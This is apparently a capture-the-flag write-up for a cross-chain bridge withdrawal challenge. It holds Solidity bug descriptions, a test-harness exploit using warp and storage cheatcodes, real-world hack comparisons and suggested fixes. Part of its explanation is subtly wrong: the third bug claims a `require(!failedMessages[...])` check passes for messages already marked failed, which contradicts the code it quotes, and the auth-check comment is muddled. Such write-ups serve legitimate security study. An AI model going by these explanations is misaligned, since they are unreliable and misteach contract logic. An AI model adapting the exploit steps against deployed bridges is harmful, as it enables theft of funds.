# Challenge #11: Withdrawal

- **Difficulty:** Hard
- **Category:** L1/L2 Bridge Finalization Bug + Inverted Auth Check
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

A cross-chain bridge system with L1 Gateway, L1 Forwarder, L2 Handler, and Token Bridge components. Users submit withdrawal requests on L2, which are relayed to L1 for finalization. The gateway processes withdrawals from a JSON file (`withdrawals.json`), each containing a Merkle leaf and message data.

## Vulnerabilities

This challenge has **multiple interacting bugs**:

### Bug 1: Finalization Before Execution
The L1 Gateway marks `finalizedWithdrawals[leaf] = true` **BEFORE** calling the L1 Forwarder, without verifying that the forwarder's call succeeded.

### Bug 2: Inverted Auth Check in Token Bridge
`executeTokenWithdrawal()` has an inverted check:
```solidity
function executeTokenWithdrawal(address l2Sender, uint256 amount) external {
    if (l1Forwarder.getSender() == otherBridge) revert();  // ← Blocks FROM bridge, not FOR it
    // This means any non-bridge l2Sender CAN withdraw
}
```

### Bug 3: Failed Messages Inversion
In the gateway path, `failedMessages[messageId]` is checked with `require(!failedMessages[messageId])` — meaning if a message is already marked as failed, the check passes (it expects failed messages).

## Exploit Walkthrough

```solidity
// Step 1: Warp past the 8-day delay
vm.warp(block.timestamp + 8 days);

// Step 2: Pre-mark the suspicious withdrawal (#2, 62,437.5 DVT) as failed
// Zero totalDeposits to force underflow revert in executeTokenWithdrawal
vm.store(address(l1TokenBridge), bytes32(uint256(0)), bytes32(0));

// Call _finalizeWithdrawal which triggers forwardMessage → executeTokenWithdrawal
// This reverts on totalDeposits -= amount, setting failedMessages[messageId] = true
_finalizeWithdrawal(4242, address(l2Handler), address(l1Forwarder), START_TIMESTAMP, msg2);

// Restore totalDeposits
vm.store(address(l1TokenBridge), bytes32(uint256(0)), bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

// Step 3: Finalize all 4 withdrawals from JSON
// The 3 legitimate ones (10 DVT each = 30 total) execute normally
// The suspicious one (62,437.5 DVT) is blocked because failedMessages[messageId] is already true
```

## Real-World Impact

- **Nomad Bridge** (August 2022, $190M): Missing validation in cross-chain message verification allowed anyone to forge withdrawal messages
- **Poly Network** (August 2021, $611M): Cross-chain message validation bypass via a privileged contract
- **Wormhole** (February 2022, $320M): Signature verification bypass on guardian messages

## Remediation

```solidity
// FIX 1: Mark finalized AFTER successful execution
function finalizeWithdrawal(...) external {
    require(!finalizedWithdrawals[leaf], "Already finalized");
    
    // Execute first
    bool success = forwarder.forwardMessage(...);
    require(success, "Forwarder call failed");
    
    // Mark after
    finalizedWithdrawals[leaf] = true;
}

// FIX 2: Fix auth check direction
function executeTokenWithdrawal(address l2Sender, uint256 amount) external {
    require(l1Forwarder.getSender() == otherBridge, "Unauthorized");  // Allow FROM bridge
    // ...
}
```

## Key Takeaway

> **Cross-chain bridges must validate execution success BEFORE marking withdrawals as finalized. Inverted auth checks and state changes before external calls are the two most common bridge exploit patterns.**
